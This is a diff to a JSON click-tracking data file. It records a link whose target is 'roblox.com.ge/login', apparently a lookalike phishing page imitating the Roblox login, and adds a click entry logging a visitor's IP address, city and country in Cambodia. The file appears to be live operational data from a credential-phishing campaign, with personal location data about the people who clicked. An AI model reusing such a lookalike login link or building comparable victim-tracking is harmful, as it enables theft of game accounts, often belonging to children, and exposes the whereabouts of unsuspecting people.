@@ -166,7 +166,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1643,
+    "useCount": 1644,
     "createdBy": "admin",
     "clicks": [
       {
@@ -13307,6 +13307,14 @@
       },
       {
         "timestamp": 1777567266114,
+        "ip": "175.100.33.153",
+        "country": "Cambodia",
+        "city": "Phnom Penh",
+        "flag": "🇰🇭",
+        "countryCode": "KH"
+      },
+      {
+        "timestamp": 1777567441958,
         "ip": "175.100.33.153",
         "country": "Cambodia",
         "city": "Phnom Penh",
